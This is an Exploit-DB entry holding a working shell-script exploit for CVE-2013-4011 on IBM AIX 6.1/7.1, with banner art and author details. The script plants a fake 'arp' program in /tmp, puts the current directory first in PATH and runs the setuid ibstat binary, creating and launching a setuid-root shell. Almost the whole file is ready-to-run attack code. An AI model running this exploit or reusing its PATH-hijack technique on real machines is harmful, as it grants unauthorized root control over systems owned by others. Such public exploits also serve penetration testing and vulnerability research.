# Also available as a module in Metasploit

# Exploit-DB Note: Screenshot provided by exploit author
#
 
#!/bin/sh
# Exploit Title: IBM AIX 6.1 / 7.1 local root privilege escalation
# Date: 2013-09-24
# Exploit Author: Kristian Erik Hermansen <kristian.hermansen@gmail.com>
# Vendor Homepage: http://www.ibm.com
# Software Link: http://www-03.ibm.com/systems/power/software/aix/about.html
# Version: IBM AIX 6.1 and 7.1, and VIOS 2.2.2.2-FP-26 SP-02
# Tested on: IBM AIX 6.1
# CVE: CVE-2013-4011
echo '
   mm   mmmmm  m    m
   ##     #     #  #
  #  #    #      ## 
  #mm#    #     m""m
 #    # mm#mm  m"  "m
'
echo "[*] AIX root privilege escalation"
echo "[*] Kristian Erik Hermansen"
echo "[*] https://linkedin.com/in/kristianhermansen"
echo "
+++++?????????????~.:,.:+???????????++++
+++++???????????+...:.,.,.=??????????+++
+++???????????~.,:~=~:::..,.~?????????++
+++???????????:,~==++++==~,,.?????????++
+++???????????,:=+++++++=~:,,~????????++
++++?????????+,~~=++++++=~:,,:????????++
+++++????????~,~===~=+~,,::,:+???????+++
++++++???????=~===++~~~+,,~::???????++++
++++++++?????=~=+++~~~:++=~:~+???+++++++
+++++++++????~~=+++~+=~===~~:+??++++++++
+++++++++?????~~=====~~==~:,:?++++++++++
++++++++++????+~==:::::=~:,+??++++++++++
++++++++++?????:~~=~~~~~::,??+++++++++++
++++++++++?????=~:~===~,,,????++++++++++
++++++++++???+:==~:,,.:~~..+??++++++++++
+++++++++++....==+===~~=~,...=?+++++++++
++++++++,........~=====..........+++++++
+++++................................++=
=+:....................................=
"
TMPDIR=/tmp
TAINT=${TMPDIR}/arp
RSHELL=${TMPDIR}/r00t-sh
 
cat > ${TAINT} <<-!
#!/bin/sh
cp /bin/sh ${RSHELL}
chown root ${RSHELL}
chmod 4555 ${RSHELL}
!
 
chmod 755 ${TAINT}
PATH=.:${PATH}
export PATH
cd ${TMPDIR}
/usr/bin/ibstat -a -i en0 2>/dev/null >/dev/null
if [ -e ${RSHELL} ]; then
  echo "[+] Access granted. Don't be evil..."
  ${RSHELL}
else
  echo "[-] Exploit failed. Try some 0day instead..."
fi